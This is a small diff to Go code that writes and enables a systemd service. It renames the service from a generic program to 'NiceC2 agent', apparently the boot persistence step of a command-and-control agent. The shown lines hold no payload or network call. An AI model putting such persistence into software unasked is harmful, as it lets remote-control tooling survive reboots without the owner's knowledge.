@@ -261,7 +261,7 @@ func Linux() {
 
 	// Write the service file content
 	_, err = serviceFile.WriteString(`[Unit]
-Description=My program service
+Description=NiceC2 agent
 After=network.target
 
 [Service]
@@ -286,7 +286,7 @@ WantedBy=multi-user.target`)
 	}
 
 	// Enable the service to auto-start at boot
-	enableCmd := exec.Command("systemctl", "enable", "myprogram.service")
+	enableCmd := exec.Command("systemctl", "enable", "NiceC2.service")
 	err = enableCmd.Run()
 	if err != nil {
 		fmt.Println("Error enabling service to auto-start at boot:", err)
